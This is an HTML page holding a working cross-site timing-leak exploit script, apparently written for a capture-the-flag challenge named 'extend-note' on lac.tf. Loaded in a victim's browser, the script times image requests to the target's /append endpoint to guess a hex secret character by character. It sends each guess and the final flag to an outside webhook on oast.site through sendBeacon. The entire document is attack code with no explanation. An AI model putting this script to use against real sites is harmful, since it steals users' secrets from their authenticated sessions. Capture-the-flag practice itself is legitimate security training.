<!DOCTYPE html>
<html>
<head><title>Exploit</title></head>
<body>
<div id="s"></div>
<script>
const TARGET = "https://extend-note-45dvz.instancer.lac.tf/";
const WEBHOOK = "https://u9j7y0ead18nsie7akmt7p1n3qu3aoapb.oast.site";
const CHARS = "0123456789abcdef";

// Get mode from URL: ?m=1 for first half, ?m=2 for second half
const params = new URLSearchParams(location.search);
const mode = params.get('m') || '1';
const prefix = params.get('p') || '';

const report = (d) => navigator.sendBeacon(`${WEBHOOK}/${encodeURIComponent(JSON.stringify(d))}`);

async function probe(content) {
    const url = `${TARGET}/append?content=${encodeURIComponent(content)}&url=${TARGET}/`;
    const t0 = performance.now();
    
    return new Promise((resolve) => {
        const img = new Image();
        let done = false;
        
        const finish = () => {
            if (!done) {
                done = true;
                img.src = '';
                resolve(performance.now() - t0);
            }
        };
        
        setTimeout(finish, 800);
        img.onload = img.onerror = finish;
        img.src = url + `&_=${Date.now()}${Math.random()}`;
    });
}

async function crack() {
    let startPos, endPos, secret;
    
    if (mode === '1') {
        startPos = 0;
        endPos = 4;
        secret = "";
    } else {
        startPos = 4;
        endPos = 8;
        secret = prefix;
    }
    
    report({start: mode, prefix: secret});
    
    for (let pos = startPos; pos < endPos; pos++) {
        // Baseline
        const b1 = await probe("INVALID_" + Math.random());
        await new Promise(r => setTimeout(r, 100));
        const b2 = await probe("NOTREAL_" + Math.random());
        const baseline = (b1 + b2) / 2;
        
        await new Promise(r => setTimeout(r, 150));
        
        // Test all chars
        const results = [];
        for (const c of CHARS) {
            const attempt = secret + c;
            
            const t1 = await probe(attempt);
            await new Promise(r => setTimeout(r, 80));
            const t2 = await probe(attempt);
            
            const avg = (t1 + t2) / 2;
            const delta = baseline - avg;
            
            results.push({c, avg, delta});
            await new Promise(r => setTimeout(r, 80));
        }
        
        results.sort((a, b) => b.delta - a.delta);
        const winner = results[0];
        secret += winner.c;
        
        report({
            mode,
            pos,
            char: winner.c,
            secret,
            delta: winner.delta.toFixed(2),
            top3: results.slice(0, 3).map(r => ({c: r.c, d: r.delta.toFixed(1)}))
        });
        
        await new Promise(r => setTimeout(r, 200));
    }
    
    document.getElementById('s').textContent = secret;
    
    if (mode === '2') {
        await new Promise(r => setTimeout(r, 1000));
        const res = await fetch(`${TARGET}/flag?secret=${encodeURIComponent(secret)}`);
        const flag = await res.text();
        report({secret, flag, done: true});
        document.getElementById('s').textContent = flag;
    } else {
        report({half1: secret, done: true});
    }
}

crack();
</script>
</body>
</html>
